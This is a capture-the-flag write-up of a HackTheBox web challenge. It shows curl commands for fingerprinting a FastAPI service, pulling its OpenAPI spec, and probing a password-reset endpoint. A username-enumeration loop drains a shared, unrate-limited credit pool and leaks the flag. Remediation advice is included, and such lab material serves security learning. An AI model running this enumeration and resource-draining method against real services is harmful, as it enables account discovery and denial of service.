# SR Network — Web / API

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Web / API · **Result:** ✅ Solved
**Flag:** `HTB{f0rg3_s1gn4l_k3y_0v3rl0ad_y3y_6af947840b1b58a27f6f514738fbd823}`

---

## The short version

A website had a feature that quietly spent from a shared pool of "credits" every single time it
ran, and nothing stopped me from running it over and over. Once I drained that pool to zero, the
error message the server returned handed me the flag.

## Background on the challenge

The target was the "Star Forger Signal Relay," a **FastAPI** service. The scenario said an
attacker was "rapidly consuming the corporation's quantum credits" — which turned out to be a
direct hint at the vulnerability. The brief also noted API docs were at `/docs/`. This is
important because FastAPI auto-generates docs, and those docs usually hand over the full attack
surface for free.

## Step-by-step walkthrough (with the actual commands)

**Step 1 — Fingerprint the target.**

```bash
curl -s -i --max-time 20 http://154.57.164.74:31412/ | head -40
```

It returned `HTTP/1.1 307 Temporary Redirect`, `server: uvicorn`, `location: /login`. The
`uvicorn` server confirmed FastAPI, which is why `/docs/` worked. My reasoning: if this is
FastAPI, the machine-readable spec at `/openapi.json` will list every route, so I should grab
that before guessing anything.

**Step 2 — Pull the OpenAPI spec and the login page.**

```bash
B=http://154.57.164.74:31412
curl -s --max-time 20 $B/openapi.json | head -c 6000
curl -s --max-time 20 $B/login | head -c 1500
```

The spec's title was "Star Forger Signal Relay," and reading through the routes, one description
was a giant giveaway on the password-reset endpoint:

> *"One request consume 15 star token. **TODO: add proper rate limiting to prevent star credit
> depletion.**"*

This is important because it told me the exact flaw and the intended attack in one line: each
call spends 15 credits from a shared pool, with no rate limiting and no auth.

**Step 3 — Dump the request/response schemas.**
I wanted the exact field names for each endpoint. My first try used Python, which is not installed
here:

```bash
curl -s $B/openapi.json | python -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d['components']['schemas'], indent=1))"
# -> "Python was not found..."
```

So I re-ran it with Node instead (Node is available), which worked:

```bash
curl -s $B/openapi.json | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{let d=JSON.parse(s);console.log(JSON.stringify(d.components.schemas,null,1))})"
```

This gave me `PasswordResetRequest` (just an `identifier`) and `PasswordResetVerify`
(`identifier`, `code`, `new_password`) — i.e. the reset is completed with an OTP code.

**Step 4 — Register a test account and map the credit system.**

```bash
B=http://154.57.164.74:31412
U="relaytest$RANDOM"; P="Passw0rd!$RANDOM"
curl -s -X POST $B/api/auth/register -H 'Content-Type: application/json' -d "{\"username\":\"$U\",\"password\":\"$P\",\"display_name\":\"Test\"}"
TOK=$(curl -s -X POST $B/api/auth/login -H 'Content-Type: application/json' -d "{\"username\":\"$U\",\"password\":\"$P\"}")
curl -s $B/api/me -H "Authorization: Bearer <token>"
curl -s $B/api/dashboard -H "Authorization: Bearer <token>"
```

Register returned `{"message":"User registered successfully","user_id":2}`. My reasoning: being
**user id 2** implies there is a seeded **user id 1** (an admin) that probably holds the flag. The
dashboard/`/api/me` responses did not expose any "star balance," so the flag was not on my own
account.

**Step 5 — Probe the reset flow and discover two bonus leaks.**

```bash
B=http://154.57.164.74:31412
curl -s -X POST $B/api/auth/password/reset/request -H 'Content-Type: application/json' -d '{"identifier":"relaytest12847"}'
curl -s -X POST $B/api/auth/password/reset/request -H 'Content-Type: application/json' -d '{"identifier":"admin"}'
```

A real user returned:
`{"message":"Quantum verification pulse sent...","code_hint":"Verification code starts with '9'","expires_in_minutes":15}`
while `admin` returned the generic `{"message":"If the identifier exists..."}`. This is important
for two reasons: the endpoint **leaks the OTP's first digit** (`code_hint`), and it is a
**user-enumeration oracle** (real vs unknown respond differently) — which also told me the admin
account is *not* literally named "admin."

**Step 6 — Enumerate the real target account (this triggered the win).**
I used the enumeration oracle to look for the privileged account name, looping through likely
candidates:

```bash
B=http://154.57.164.74:31412
probe(){ r=$(curl -s -X POST $B/api/auth/password/reset/request -H 'Content-Type: application/json' -d "{\"identifier\":\"$1\"}"); echo "$1 :: $r"; }
for u in admin administrator root operator starforger star_forger celestial senate relay signalrelay system sysadmin forger quantum beacon support help dev test guest user1 admin1 overseer architect keeper warden; do probe "$u"; done
```

Each of those calls spent **15 credits from the shared pool**. By the time the loop reached
`relay`, the cumulative spend had drained the pool to zero, and the response changed to the
depleted state — which leaks the key directly:

```
relay :: {"error":"Error: Company star credits depleted","status":"company_credits_empty",
"message":"Insufficient company star credits...","forge_signal_key":"HTB{f0rg3_s1gn4l_k3y_0v3rl0ad_y3y_6af947840b1b58a27f6f514738fbd823}"}
```

This is important because it shows the real vulnerability is a **shared, global** resource being
spent by an endpoint anyone can call unlimited times — the enumeration loop *was* the credit-drain
attack.

**Step 7 — Submit the flag.**
`HTB{f0rg3_s1gn4l_k3y_0v3rl0ad_y3y_6af947840b1b58a27f6f514738fbd823}`.

## Technical detail

- **Stack:** FastAPI (Swagger at `/docs/`, spec at `/openapi.json`), `uvicorn`.
- **Vulnerable endpoint:** `POST /api/auth/password/reset/request` — unauthenticated, no rate
  limit, deducts 15 credits per call from a single global pool.
- **Root cause:** a shared finite resource spent by an endpoint any anonymous user can hammer.
- **Information leak on failure:** the depleted-state response discloses the secret key — turning
  a denial-of-service into full secret disclosure.
- **Secondary issues:** user enumeration (differential responses) and partial OTP disclosure
  (first digit).

## Lessons / remediation

- **Rate-limit (and authenticate) any endpoint that spends a shared/billable resource** — the exact
  fix the developer's own TODO described.
- **Never put secrets in an error/failure response.**
- **Return uniform responses** for valid vs invalid identifiers; never leak any part of an OTP.

## Tools used

- `curl` — recon, registration, reset-flow probing, and the enumeration loop that drained the pool.
- `node` (inline) — to parse the OpenAPI JSON after `python` turned out to be unavailable.
